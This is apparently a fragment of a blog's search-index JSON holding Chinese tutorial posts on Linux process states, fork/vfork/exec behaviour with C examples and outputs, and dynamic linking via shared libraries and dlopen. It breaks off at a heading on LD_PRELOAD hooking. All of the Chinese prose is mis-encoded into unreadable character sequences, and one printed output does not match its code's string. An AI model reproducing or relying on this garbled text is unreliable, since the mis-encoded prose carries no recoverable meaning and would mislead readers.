","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:1:1","tags":["linux","reverse"],"title":"linuxè¿›ç¨‹åŸºç¡€","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"S(TASK_INTERRUPTIBLE)ï¼Œå¯ä¸­æ–­çš„ç¡çœ çŠ¶æ€ å¤„äºè¿™ä¸ªçŠ¶æ€çš„è¿›ç¨‹åœ¨ç­‰å¾…ç€æŸäº›äº‹ä»¶çš„å‘ç”Ÿï¼ˆå¦‚ç­‰å¾…socketè¿æ¥ã€ç­‰å¾…ä¿¡å·é‡ç­‰ï¼‰ï¼Œå±äºæŒ‚èµ·ï¼ˆç¡çœ ï¼‰çŠ¶æ€ã€‚ä½¿ç”¨topå‘½ä»¤å¯ä»¥å‘ç°ç»å¤§å¤šæ•°è¿›ç¨‹éƒ½å¤„äºè¿™ä¸ªçŠ¶æ€ ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:1:2","tags":["linux","reverse"],"title":"linuxè¿›ç¨‹åŸºç¡€","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"D(TASK_UNINTERRUPTIBLE)ï¼Œä¸å¯ä¸­æ–­çš„ç¡çœ çŠ¶æ€ ä¸SçŠ¶æ€ç±»ä¼¼ï¼Œè¿›ç¨‹å¤„äºæŒ‚èµ·ï¼ˆç¡çœ ï¼‰çŠ¶æ€ï¼Œä½†æ­¤æ—¶è¿›ç¨‹æ— æ³•è¢«ä¸­æ–­/æ€æ­»ï¼Œä¸ä¼šå“åº”è¿›ç¨‹ä¿¡å·ï¼ˆå¦‚SIGKILLï¼‰ï¼Œå¸¸ç”¨äºç³»ç»Ÿåº•å±‚æŸäº›ä¸èƒ½è¢«æ‰“æ–­çš„è¿›ç¨‹ ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:1:3","tags":["linux","reverse"],"title":"linuxè¿›ç¨‹åŸºç¡€","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"T(TASK_STOPPED)ï¼Œæš‚åœçŠ¶æ€ å‘å¤„äºTASK_RUNNINGçŠ¶æ€çš„è¿›ç¨‹å‘é€ä¸€ä¸ªSIGSTOPä¿¡å·å¯ä»¥å¼ºåˆ¶ä½¿è¿›ç¨‹åœæ­¢ï¼Œæ¥åˆ°TASK_STOPPEDçŠ¶æ€ï¼Œå½“æ¥æ”¶åˆ°SIGCONTä¿¡å·æ—¶ï¼Œè¿›ç¨‹å°†é‡æ–°å›åˆ°TASK_RUNNINGçŠ¶æ€ ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:1:4","tags":["linux","reverse"],"title":"linuxè¿›ç¨‹åŸºç¡€","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"t(TASK_TRACED)ï¼Œæ­£åœ¨è¢«è·Ÿè¸ªçŠ¶æ€ æ­¤çŠ¶æ€ä¸‹çš„è¿›ç¨‹ä¹Ÿä¼šæš‚åœä¸‹æ¥ï¼Œç­‰å¾…è·Ÿè¸ªå®ƒçš„è°ƒè¯•è¿›ç¨‹å¯¹å®ƒè¿›è¡Œæ“ä½œã€‚ä¸TASK_STOPPEDçŠ¶æ€ä¸åŒï¼Œæ­¤çŠ¶æ€ä¸ä¼šç›¸åº”SIGCONTä¿¡å·ï¼Œåªæœ‰è°ƒè¯•è¿›ç¨‹è°ƒç”¨PTRACE_CONTã€PTRACE_DETACHæˆ–è¿›ç¨‹é€€å‡ºæ—¶è¢«è°ƒè¯•çš„è¿›ç¨‹æ‰èƒ½æ¢å¤TASK_RUNNINGçŠ¶æ€ ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:1:5","tags":["linux","reverse"],"title":"linuxè¿›ç¨‹åŸºç¡€","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"Z(TASK_DEAD-EXIT_ZOMBIE)é€€å‡ºçŠ¶æ€ï¼Œæˆä¸ºåƒµå°¸è¿›ç¨‹ å¤§è‡´å¯åˆ†ä¸ºä¸¤ç§æƒ…å†µï¼š å­è¿›ç¨‹é€€å‡ºä½†çˆ¶è¿›ç¨‹å¹¶æœªåŠæ—¶é‡Šæ”¾å­è¿›ç¨‹ï¼Œç§°ä¸ºåƒµå°¸çŠ¶æ€ çˆ¶è¿›ç¨‹é€€å‡ºï¼Œä½†å­è¿›ç¨‹ä»ç„¶å­˜åœ¨ï¼Œç§°ä¸ºå­¤å„¿çŠ¶æ€ ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:1:6","tags":["linux","reverse"],"title":"linuxè¿›ç¨‹åŸºç¡€","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"X(TASK_DEAD-EXIT_DEAD)é€€å‡ºçŠ¶æ€ï¼Œè¿›ç¨‹å³å°†è¢«é”€æ¯ è¿›ç¨‹è¢«ç½®äºæ­¤çŠ¶æ€æ—¶ï¼Œæ¥ä¸‹æ¥ç«‹å³ä¼šè¢«å®Œå…¨é‡Šæ”¾ï¼Œæ­¤çŠ¶æ€æŒç»­æ—¶é—´ååˆ†çŸ­æš‚ ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:1:7","tags":["linux","reverse"],"title":"linuxè¿›ç¨‹åŸºç¡€","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"è¿›ç¨‹ä¿¡å· æ§åˆ¶è¿›ç¨‹çŠ¶æ€çš„æ›´æ–°ã€å˜æ¢éœ€è¦ç³»ç»Ÿå‘å‡ºä¿¡å·ï¼Œå³è¿›ç¨‹ä¿¡å·ï¼Œè¿›ç¨‹ä¿¡å·åˆ—è¡¨å¯ä»¥ä½¿ç”¨kill -læŸ¥çœ‹ï¼Œ è¿›ç¨‹ä¿¡å·è°ƒæ§è¿›ç¨‹çŠ¶æ€ï¼Œå¤§è‡´å¦‚ä¸‹å›¾ï¼š æ³¨ï¼šå›¾ä¸­Runningå’ŒReadyåŒå±TASK_RUNNINGçŠ¶æ€ ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:2:0","tags":["linux","reverse"],"title":"linuxè¿›ç¨‹åŸºç¡€","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"è¿›ç¨‹åˆ›å»º linuxç”¨æˆ·æ€åˆ›å»ºè¿›ç¨‹å¸¸ç”¨forkã€vforkã€cloneä¸‰ä¸ªå‡½æ•° ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:3:0","tags":["linux","reverse"],"title":"linuxè¿›ç¨‹åŸºç¡€","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"åŸç† ä¸‰è€…éƒ½æ˜¯ä¾æ‰˜çˆ¶è¿›ç¨‹åˆ›å»ºæ–°çš„å­è¿›ç¨‹ï¼Œå‡½æ•°è¿”å›å€¼åœ¨ä¸åŒè¿›ç¨‹ä¸­å€¼ä¸åŒï¼Œåœ¨å­è¿›ç¨‹ä¸­è¿”å›0ï¼Œåœ¨çˆ¶è¿›ç¨‹ä¸­è¿”å›å­è¿›ç¨‹pidï¼Œè¿”å›å€¼ä¸ºè´Ÿæ•°åˆ™åˆ›å»ºå­è¿›ç¨‹å¤±è´¥ã€‚ ä¸‰è€…åŒºåˆ«åœ¨äºå¯¹è¿›ç¨‹ç©ºé—´çš„ä½¿ç”¨ã€‚forkå‡½æ•°åˆ›å»ºçš„å­è¿›ç¨‹ä¼šå¤åˆ¶ä¸€ä»½çˆ¶è¿›ç¨‹çš„è¿›ç¨‹ç©ºé—´ï¼Œvforkå‡½æ•°åˆ›å»ºçš„å­è¿›ç¨‹ä¸çˆ¶è¿›ç¨‹ä½¿ç”¨åŒä¸€ä»½è¿›ç¨‹ç©ºé—´ï¼Œè€Œcloneå‡½æ•°å¯é€‰æ˜¯å¦å…±ç”¨å„ç§èµ„æºã€‚ forkå’Œvforkå‡½æ•°è¿˜æœ‰å¦å¤–ä¸€ä¸ªåŒºåˆ«ï¼šforkå‡½æ•°åˆ›å»ºçš„å­è¿›ç¨‹ä¸çˆ¶è¿›ç¨‹åŒæ—¶è¿è¡Œï¼Œå…ˆåé¡ºåºéšå³ã€‚è€Œvforkå‡½æ•°ä¿è¯å­è¿›ç¨‹å…ˆè¿è¡Œï¼Œåªæœ‰å½“å­è¿›ç¨‹é€€å‡ºæ—¶æ‰ä¼šè¿è¡Œçˆ¶è¿›ç¨‹ï¼Œç¡®ä¿ä¸ä¼šå‘ç”ŸåŒæ—¶è¯»å†™å†…å­˜ç­‰ç«äº‰é—®é¢˜ã€‚ ä¸‹é¢é’ˆå¯¹forkå’Œvforkå‡½æ•°è¿›è¡Œå°è¯•ï¼š ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:3:1","tags":["linux","reverse"],"title":"linuxè¿›ç¨‹åŸºç¡€","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"ä½¿ç”¨forkå‡½æ•° #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003csys/types.h\u003e int main() { int num = 1; pid_t pid = fork(); // åˆ›å»ºå­è¿›ç¨‹ if (pid == -1) { puts(\"failed to create child process\"); return -1; } else if (pid == 0) { puts(\"in child process\"); printf(\"pid = %d\\n\", getpid()); printf(\"num = %d\\n\", num); num = 10; printf(\"num is modified by child process\\nnow num = %d\\n\\n\", num); } else { sleep(1); // ç¡®ä¿çˆ¶è¿›ç¨‹è¿è¡Œåˆ°è¿™æ—¶å­è¿›ç¨‹å·²å®Œæˆäº†å¯¹numçš„ä¿®æ”¹ puts(\"in parent process\"); printf(\"pid = %d\\n\", getpid()); printf(\"child process pid is %d\\n\", pid); // çˆ¶è¿›ç¨‹ä¸­forkå‡½æ•°è¿”å›å€¼ä¸ºå­è¿›ç¨‹pid printf(\"num = %d\\n\\n\", num); } } ç¨‹åºè¾“å‡ºï¼šs in child process pid = 61209 num = 1 test is modified by child process now num = 10 in parent process pid = 61208 child process pid is 61209 num = 1 å¯ä»¥çœ‹åˆ°åœ¨å­è¿›ç¨‹ä¸­ä¿®æ”¹äº†numçš„å€¼ï¼Œå¯¹çˆ¶è¿›ç¨‹çš„numæ²¡æœ‰å½±å“ï¼Œæ­£æ˜¯å› ä¸ºçˆ¶ã€å­è¿›ç¨‹è¿›ç¨‹ç©ºé—´ç›¸äº’ç‹¬ç«‹ ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:3:2","tags":["linux","reverse"],"title":"linuxè¿›ç¨‹åŸºç¡€","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"vforkå‡½æ•° ä½¿ç”¨exitå‡½æ•°æ­£å¸¸é€€å‡ºå­è¿›ç¨‹ #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003csys/types.h\u003e int main() { int num = 1; pid_t pid = vfork(); if (pid == -1) { puts(\"failed to create child process\"); return -1; } else if (pid == 0) { puts(\"in child process\"); printf(\"pid = %d\\n\", getpid()); printf(\"num = %d\\n\", num); num = 10; printf(\"test is modified by child process\\nnow num = %d\\n\\n\", num); exit(0); // é€€å‡ºå­è¿›ç¨‹ } else { puts(\"in parent process\"); printf(\"pid = %d\\n\", getpid()); printf(\"child process pid is %d\\n\", pid); // çˆ¶è¿›ç¨‹ä¸­vforkå‡½æ•°è¿”å›å€¼ä¸ºå­è¿›ç¨‹pid printf(\"num = %d\\n\\n\", num); } } ç¨‹åºè¾“å‡ºï¼š in child process pid = 62770 num = 1 test is modified by child process now num = 10 in parent process pid = 62769 child process pid is 62770 num = 10 å¯ä»¥çœ‹åˆ°åœ¨å­è¿›ç¨‹ä¸­ä¿®æ”¹numçš„å€¼ï¼Œåœ¨çˆ¶è¿›ç¨‹ä¸­è¾“å‡ºnumçš„å€¼ä¹Ÿæ”¹å˜äº†ï¼Œæ­£æ˜¯å› ä¸ºä¸¤è¿›ç¨‹å…±ç”¨ä¸€å—è¿›ç¨‹ç©ºé—´ ä¸èƒ½ä½¿ç”¨returné€€å‡ºå­è¿›ç¨‹ å°†ä¸Šä¸ªä¾‹å­ä¸­ä½¿ç”¨exit(0)é€€å‡ºå­è¿›ç¨‹æ”¹ä¸ºä½¿ç”¨return 0è¯•è¯•æ•ˆæœï¼š #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003csys/types.h\u003e int main() { int num = 1; pid_t pid = vfork(); if (pid == -1) { puts(\"failed to create child process\"); return -1; } else if (pid == 0) { puts(\"in child process\"); printf(\"pid = %d\\n\", getpid()); printf(\"num = %d\\n\", num); num = 10; printf(\"test is modified by child process\\nnow num = %d\\n\\n\", num); return 0; } else { puts(\"in parent process\"); printf(\"pid = %d\\n\", getpid()); printf(\"child process pid is %d\\n\", pid); // çˆ¶è¿›ç¨‹ä¸­vforkå‡½æ•°è¿”å›å€¼ä¸ºå­è¿›ç¨‹pid printf(\"num = %d\\n\\n\", num); } } ç¨‹åºè¾“å‡ºï¼š in child process pid = 65039 num = 1 test is modified by child process now num = 10 in parent process pid = 65038 child process pid is 65039 num = -1431084768 å¯ä»¥å‘ç°çˆ¶è¿›ç¨‹è¾“å‡ºçš„numå‡ºç°äº†é”™è¯¯ã€‚ è¿™æ˜¯å› ä¸ºå­è¿›ç¨‹ä½¿ç”¨returnè¿”å›æ„å‘³ç€å­è¿›ç¨‹ä¸­çš„mainå‡½æ•°ç»“æŸäº†ï¼Œmainå‡½æ•°çš„æ ˆä¼šè¢«å›æ”¶ï¼Œç„¶åå­è¿›ç¨‹ç»“æŸã€‚å› ä¸ºçˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹å…±äº«è¿™ä¸ªæ ˆï¼Œè€Œæ ˆä¸­å­˜æ”¾çš„numå€¼å·²ä¸å­˜åœ¨ï¼Œæ•…ä¼šæ‰“å°å‡ºé”™ã€‚ æ›´è¿›ä¸€æ­¥ï¼Œå¦‚æœæŠŠreturnä¹Ÿå»æ‰ï¼Œä¼šå‘ç°æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºå‡½æ•°æ­£å¸¸ç»“æŸï¼Œä¸€æ ·ä¼šè¿›è¡Œæ ˆå›æ”¶ã€‚ æ€»ç»“æ¥è¯´ï¼Œå­è¿›ç¨‹é€€å‡ºä¸€èˆ¬éƒ½è¦ä½¿ç”¨exitå‡½æ•° ä½¿ç”¨execå‡½æ•°æ—è°ƒèµ·æ–°çš„è¿›ç¨‹ execå‡½æ•°æ—åˆ†åˆ«åŒ…æ‹¬ä»¥ä¸‹å‡½æ•°ï¼š int execl(const char *path, const char *arg, ...); int execlp(const char *file, const char *arg, ...); int execle(const char *path, const char *arg, ..., char * const envp[]); int execv(const char *path, char *const argv[]); int execvp(const char *file, char *const argv[]); int execve(const char *path, char *const argv[], char *const envp[]); å…¶ä¸­execveæ˜¯linuxçš„ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå…¶ä»–å‡½æ•°éƒ½æ˜¯å¯¹å®ƒçš„å°è£…ã€‚åŠŸèƒ½æ˜¯æ ¹æ®æŒ‡å®šçš„è·¯å¾„æˆ–æ–‡ä»¶åæ‰¾åˆ°ç›¸åº”çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä½¿ç”¨è¯¥å¯æ‰§è¡Œæ–‡ä»¶çš„ä»£ç æ®µã€æ•°æ®æ®µã€å †æ ˆæ•°æ®æ›¿æ¢å½“å‰è¿›ç¨‹ä¸­çš„æ•°æ®ï¼Œè¿›è¡Œæ‰§è¡Œã€‚ è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨execå‡½æ•°æ—ä¸ä¼šåˆ›å»ºæ–°çš„è¿›ç¨‹ï¼Œä¸ä¼šæ”¹å˜pidï¼Œåªæ˜¯æ›¿æ¢äº†å½“å‰è¿›ç¨‹ç©ºé—´çš„æ•°æ®ã€‚ å›å½’æ­£é¢˜ï¼Œæœ€å¼€å§‹åªæœ‰ä¸€ä¸ªforkå‡½æ•°å¯ä»¥ç”¨æ¥åˆ›å»ºæ–°è¿›ç¨‹ï¼Œä½†å¾ˆå¤šç¨‹åºä¸­ä»…ä»…æ˜¯åœ¨æ–°è¿›ç¨‹ä¸­ä½¿ç”¨äº†execå‡½æ•°æ—è°ƒèµ·äº†æ–°çš„è¿›ç¨‹ï¼Œè¿™æ—¶forkå‡½æ•°å¤åˆ¶æ•´ä¸ªçˆ¶è¿›ç¨‹çš„è¿›ç¨‹ç©ºé—´å°±æˆäº†æµªè´¹ã€‚äºæ˜¯åæ¥æ‰äº§ç”Ÿäº†vforkå‡½æ•°ã€‚ å®è·µä¸€ä¸‹ï¼š #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003csys/types.h\u003e int main() { int num = 1; pid_t pid = vfork(); if (pid == -1) { puts(\"failed to create child process\"); return -1; } else if (pid == 0) { puts(\"in child process\"); printf(\"pid = %d\\n\", getpid()); printf(\"num = %d\\n\", num); num = 10; printf(\"test is modified by child process\\nnow num = %d\\n\\n\", num); char *argv[] = {\"ls\", \"-l\", \"/\", NULL}; execve(\"/bin/ls\", argv, NULL); // è°ƒèµ·lsè¿›ç¨‹ perror(\"error exec\"); // æ‰“å°é”™è¯¯ } else { sleep(1); puts(\"in parent process\"); printf(\"pid = %d\\n\", getpid()); printf(\"child process pid is %d\\n\", pid); // çˆ¶è¿›ç¨‹ä¸­vforkå‡½æ•°è¿”å›å€¼ä¸ºå­è¿›ç¨‹pid printf(\"num = %d\\n\\n\", num); } return 0; } ç¨‹åºè¾“å‡ºï¼š in child process pid = 70303 num = 1 test is modified by child process now num = 10 total 33570236 lrwxrwxrwx 1 root root 7 Oct 19 05:01 bin -\u003e usr/bin drwxr-xr-x 4 root root 4096 Nov 12 10:30 boot drwxr-xr-x 23 root root 4360 Nov 17 10:09 dev drwxr-xr-x 133 root root 12288 Nov 17 14:21 etc drwxr-xr-x 3 root root 4096 Jan 23 2022 home lrwxrwxrwx 1 root root 7 Oct 19 05:01 lib -\u003e usr/lib lrwxrwxrwx 1 root root 7 Oct 19 05:01 lib64 -\u003e usr/lib drwx------ 2 root root 16384 Jan 23 2022 lost+found drwxr-xr-x 3 root root 4096 Oct 19 00:40 mnt drwxr-xr-x 28 root root 4096 Nov 11 01:15 opt dr-xr-xr-x 429 root root 0 Nov 17 10:09 proc drwxr-x--- 26 root root 4096 Nov 10 18:35 root drwxr-xr-x 34 root root 940 Nov 17 14:19 run lrwxrwxrwx 1 root root 7 Oct 19 05:01 sbin -\u003e usr/bin drwxr-xr-x 4 root root 4096 Jan 23 2022 srv -rw------- 1 root root 34359738368 Nov 2 23:05 swapfile dr-xr-xr-x 13 root root 0 Nov 17 10:09","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:3:3","tags":["linux","reverse"],"title":"linuxè¿›ç¨‹åŸºç¡€","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"Reference Linuxç³»ç»Ÿä¹‹è¿›ç¨‹çŠ¶æ€ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ è¿›ç¨‹çº¿ç¨‹å¸¸è§åŸºç¡€é—®é¢˜ | Whatbeg's blog https://book.itheima.net/course/223/1277519158031949826/1277528003525484545 https://www.zhihu.com/question/515280466 ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:4:0","tags":["linux","reverse"],"title":"linuxè¿›ç¨‹åŸºç¡€","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"åŠ¨æ€é“¾æ¥æ¦‚è¿° ç¨‹åºå‘˜åœ¨ç¼–å†™ä»£ç æ—¶ï¼Œå¸¸å¸¸éœ€è¦ä½¿ç”¨å¤–éƒ¨åº“ã€‚å¤–éƒ¨åº“æœ‰é™æ€åº“å’ŒåŠ¨æ€åº“ä¹‹åˆ†ï¼ŒäºŒè€…éƒ½æ˜¯ç»è¿‡ç¼–è¯‘ã€æ±‡ç¼–ä½†æœªè¿›è¡Œé“¾æ¥çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆELFæ–‡ä»¶ï¼‰ã€‚ äºŒè€…åŒºåˆ«åœ¨äºä¸‹ä¸€æ­¥å‚ä¸é“¾æ¥çš„æ–¹å¼ï¼šé™æ€åº“ç”¨äºé™æ€é“¾æ¥ï¼Œç›´æ¥å°†é™æ€åº“ä¸­çš„æŒ‡ä»¤å†™å…¥æœ€ç»ˆç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚åŠ¨æ€åº“ç”¨äºåŠ¨æ€é“¾æ¥ï¼Œåªå°†ä¸€äº›é‡å®šä½å’Œç¬¦å·è¡¨ä¿¡æ¯â€œæ‹·è´â€åˆ°æœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚ åŠ¨æ€é“¾æ¥ç›¸æ¯”äºé™æ€é“¾æ¥ï¼Œä¼˜åŠ¿åœ¨äºå¾—åˆ°çš„å¯æ‰§è¡Œæ–‡ä»¶å°å¾ˆå¤šï¼Œå¯æ‰©å±•æ€§æ›´å¥½ã€æ›´æ–°è¿­ä»£æ›´å®¹æ˜“ï¼ˆåªéœ€æ›´æ”¹åŠ¨æ€é“¾æ¥åº“è€Œä¸ç”¨æ•´ä¸ªé‡æ–°ç¼–è¯‘ï¼‰ã€‚åŠ£åŠ¿ä¹Ÿå¾ˆæ˜æ˜¾ï¼šéœ€è¦è¿è¡Œæ—¶åŠ¨æ€åŠ è½½åº“å‡½æ•°ï¼Œæ¶ˆè€—æ›´å¤šæ—¶é—´å’Œèµ„æºï¼ˆä½†åœ¨å¾ˆå¤šåœºåˆä¸­è¿™ç§æ¶ˆè€—æ˜¯å€¼å¾—çš„ï¼‰ï¼Œå†æœ‰å°±æ˜¯å…¼å®¹æ€§é™ä½ï¼šä¸åŒçš„æœºå™¨ä¸Šçš„åŒååŠ¨æ€åº“å¯èƒ½æœ‰æ‰€ä¸åŒï¼Œäº§ç”Ÿå…¼å®¹æ€§é—®é¢˜ã€‚ ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:1:0","tags":["linux","reverse","binary"],"title":"linuxä¸‹é€šè¿‡è®¾ç½®LD_PRELOADç¯å¢ƒå˜é‡hookåŠ¨æ€é“¾æ¥åº“","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"ä»£ç ä¸­ä½¿ç”¨åŠ¨æ€é“¾æ¥åº“çš„ä¸¤ç§æ–¹å¼ ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:2:0","tags":["linux","reverse","binary"],"title":"linuxä¸‹é€šè¿‡è®¾ç½®LD_PRELOADç¯å¢ƒå˜é‡hookåŠ¨æ€é“¾æ¥åº“","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"åŠ è½½æ—¶é“¾æ¥ éœ€è¦åŒ…å«å¤´æ–‡ä»¶ï¼Œä½†ä»£ç ä¸­æ— éœ€å¤šä½™çš„è¯­å¥ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š main.c #include \"lib.h\" int main() { func(); return 0; } lib.h #include \u003cstdio.h\u003e void func(); lib.c #include \"lib.h\" void func() { puts(\"func is called\"); } ç”ŸæˆåŠ¨æ€é“¾æ¥åº“ gcc -fPIC --shared lib.c -o lib.so ä½¿ç”¨åŠ¨æ€é“¾æ¥åº“æ„å»ºå¯æ‰§è¡Œæ–‡ä»¶ gcc -o main main.c lib.so æ­¤æ—¶ç›´æ¥è¿è¡Œmainä¼šæŠ¥é”™æ— æ³•æ‰¾åˆ°åŠ¨æ€é“¾æ¥åº“ï¼Œè¿™é‡Œéœ€è¦æŒ‡å®šç¯å¢ƒå˜é‡LD_LIBRARY_PATH export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:./ ç„¶åè¿è¡Œ./mainå°±å¯ä»¥çœ‹è§æ­£å¸¸ç¨‹åºè¾“å‡º ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:2:1","tags":["linux","reverse","binary"],"title":"linuxä¸‹é€šè¿‡è®¾ç½®LD_PRELOADç¯å¢ƒå˜é‡hookåŠ¨æ€é“¾æ¥åº“","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"è¿è¡Œæ—¶é“¾æ¥ ä½¿ç”¨dlfcn.hä¸­å°è£…çš„å‡½æ•°ï¼Œåœ¨ä»£ç ä¸­éœ€è¦çš„åœ°æ–¹æ‰‹åŠ¨é“¾æ¥æ‰€éœ€çš„åŠ¨æ€åº“ æ­¤æ—¶ä¸éœ€è¦lib.hæ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥åœ¨lib.cä¸­ç¼–å†™å‡½æ•°é€»è¾‘ï¼š #include \u003cstdio.h\u003e void func() { puts(\"func is called\"); } ç”ŸæˆåŠ¨æ€åº“lib.so gcc -fPIC --shared lib.c -o lib.so main.c #include \u003cdlfcn.h\u003e int main() { // æ‰“å¼€åŠ¨æ€é“¾æ¥åº“ï¼Œè·å¾—åŠ¨æ€é“¾æ¥åº“çš„handle void *handle = dlopen(\"./lib.so\", RTLD_LAZY); // å®šä¹‰funcå˜é‡å½¢å¼ï¼Œå‡†å¤‡æ¥æ”¶funcå‡½æ•° void (*func)(); // ä¼ å…¥åŠ¨æ€é“¾æ¥åº“çš„handleå’Œå¯»æ‰¾çš„ç¬¦å· func = dlsym(handle, \"func\"); // æ­£å¸¸è°ƒç”¨funcå‡½æ•° func(); return 0; } ç¼–è¯‘é“¾æ¥ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ gcc -o main main.c ç›´æ¥è¿è¡Œ./mainå¯æ­£ç¡®æ‰§è¡Œå‡½æ•° ","date":"2022-11-14","objectID":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/:2:2","tags":["linux","reverse","binary"],"title":"linuxä¸‹é€šè¿‡è®¾ç½®LD_PRELOADç¯å¢ƒå˜é‡hookåŠ¨æ€é“¾æ¥åº“","uri":"/2022/11/%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AEld_preload%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fhook%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93/"},{"categories":["Binary"],"content":"ä½¿ç”¨LD_PRELOADè¿›è¡Œhook 